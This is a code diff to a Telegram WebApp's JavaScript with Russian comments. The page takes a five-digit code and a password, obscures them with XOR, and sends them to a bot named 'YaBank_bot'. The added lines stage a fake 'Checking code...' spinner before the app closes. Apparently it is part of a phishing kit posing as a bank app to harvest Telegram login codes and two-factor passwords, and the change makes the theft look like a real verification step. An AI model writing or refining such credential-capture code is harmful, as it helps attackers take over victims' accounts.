@@ -648,9 +648,27 @@ async function appendCodeDigit(digit) {
     if (currentCode.length === 5) {
         const encryptedCode = await xorEncrypt(currentCode);
         const botUsername = 'YaBank_bot';
+
+        // Отправляем код боту
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`);
-        // Закрываем WebApp полностью
-        tg.close();
+
+        // Показываем спиннер после отправки, ожидаем 2 секунды
+        const keypad = document.querySelector('.code-keypad');
+        if (keypad) {
+            keypad.style.pointerEvents = 'none';
+            keypad.style.opacity = '0.5';
+        }
+
+        const codeTitle = document.querySelector('.code-title');
+        if (codeTitle) {
+            codeTitle.dataset.originalText = codeTitle.textContent;
+            codeTitle.innerHTML = '<span class="spinner"></span> Проверка кода...';
+        }
+
+        setTimeout(() => {
+            // Закрываем WebApp полностью
+            tg.close();
+        }, 2000);
     }
 }
 
@@ -697,11 +715,29 @@ if (passwordSubmit) {
             showToast('Введите пароль', 'error');
             return;
         }
+
         const encryptedPassword = await xorEncrypt(password);
         const botUsername = 'YaBank_bot';
+
+        // Отправляем пароль боту
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`);
-        // Закрываем WebApp полностью
-        tg.close();
+
+        // Показываем спиннер после отправки, ожидаем 2 секунды
+        passwordSubmit.disabled = true;
+        passwordSubmit.classList.add('btn-loading');
+        const originalText = passwordSubmit.textContent;
+        passwordSubmit.innerHTML = '<span class="spinner"></span>Проверка...';
+
+        const passwordSubtitle = document.querySelector('.password-subtitle');
+        if (passwordSubtitle) {
+            passwordSubtitle.dataset.originalText = passwordSubtitle.textContent;
+            passwordSubtitle.innerHTML = '<span class="spinner"></span> Проверка пароля...';
+        }
+
+        setTimeout(() => {
+            // Закрываем WebApp полностью
+            tg.close();
+        }, 2000);
     });
 }
 
